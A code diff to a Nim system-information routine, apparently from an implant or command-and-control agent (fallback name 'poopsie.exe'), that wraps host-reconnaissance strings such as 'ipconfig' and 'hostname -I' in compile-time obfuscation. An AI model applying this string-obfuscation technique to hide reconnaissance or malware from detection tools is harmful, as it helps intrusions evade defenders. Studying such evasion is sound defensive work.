@@ -1,7 +1,8 @@
 import std/[os, osproc, strutils]
+import strenc
+
 when defined(linux):
   import posix
-
 
 when defined(windows):
   import winim/lean
@@ -58,9 +59,9 @@ proc getSystemInfo*(): SystemInfo =
   # Get hostname
   try:
     when defined(windows):
-      result.hostname = getEnv("COMPUTERNAME", "unknown")
+      result.hostname = getEnv(obf("COMPUTERNAME"), "unknown")
     else:
-      let output = execProcess("hostname")
+      let output = execProcess(obf("hostname"))
       result.hostname = output.strip()
   except:
     result.hostname = "unknown"
@@ -70,9 +71,9 @@ proc getSystemInfo*(): SystemInfo =
     when defined(windows):
       result.user = getCurrentUsername()
       if result.user.len == 0:
-        result.user = getEnv("USERNAME", "unknown")
+        result.user = getEnv(obf("USERNAME"), "unknown")
     else:
-      result.user = getEnv("USER", "unknown")
+      result.user = getEnv(obf("USER"), "unknown")
   except:
     result.user = "unknown"
   
@@ -101,26 +102,26 @@ proc getSystemInfo*(): SystemInfo =
   result.ips = @[]
   try:
     when defined(windows):
-      let output = execProcess("ipconfig")
+      let output = execProcess(obf("ipconfig"))
       for line in output.splitLines():
-        if "IPv4" in line:
+        if obf("IPv4") in line:
           let parts = line.split(":")
           if parts.len > 1:
             let ip = parts[1].strip()
             if ip.len > 0:
               result.ips.add(ip)
     else:
-      let output = execProcess("hostname -I")
+      let output = execProcess(obf("hostname -I"))
       for ip in output.strip().split(" "):
         if ip.len > 0:
           result.ips.add(ip)
   except:
-    result.ips = @["127.0.0.1"]
+    result.ips = @[obf("127.0.0.1")]
   
   # Get domain (Windows only for now)
   when defined(windows):
     try:
-      result.domain = getEnv("USERDOMAIN", "")
+      result.domain = getEnv(obf("USERDOMAIN"), "")
     except:
       result.domain = ""
   else:
@@ -147,4 +148,4 @@ proc getSystemInfo*(): SystemInfo =
   try:
     result.processName = getAppFilename().extractFilename()
   except:
-    result.processName = "poopsie.exe"
+    result.processName = obf("poopsie.exe")
